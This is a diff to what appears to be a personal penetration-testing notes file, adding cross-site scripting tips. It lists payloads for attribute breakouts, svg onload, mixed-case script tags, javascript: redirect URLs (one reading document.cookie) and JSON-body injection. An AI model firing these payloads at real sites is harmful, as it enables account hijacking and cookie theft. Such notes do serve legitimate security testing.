@@ -168,9 +168,24 @@ it can be exploited with the following
 
 .. test every parameters in a webapp for xss i.e param=1&param=1&param=3
 
-..
+.. if data from the parameter is reflecting on the body of the html i.e an img, iframe you can breakout using the ", and  prolly " onload=alert&#0000000040origin) value="
 
+.. from parameter you can input an encoded version of <svg/onload=alert("XSS") >
 
+.. if  encountred withform data disposition you can add Content-Disposition: form-data; name="some name"
+1<ScRiPt>alert(9639)</ScRiPt>
+
+.. any link found could be i.e redirect_to=javascript:alert("XSS"), returnTo=javascript:alert(document.cookie)
+
+.. try adding '-confirm('XSSALERT')-' to url parameter note it has to be url encoded
+
+.. you can try xss in the body of a json using mass manipulation or overwriting, i.e {
+  "ipAddress": "<svg on onload=(alert)(document.domain)>",
+  "callBackURL": "dssdsd"
+}
+
+.. you can intercept and modify a submission on a form if the form contains a json, \"javascript:alert()
+.. javascript://%0aalert(1) for links
 
 
 ############### Directory Traversal #################33333
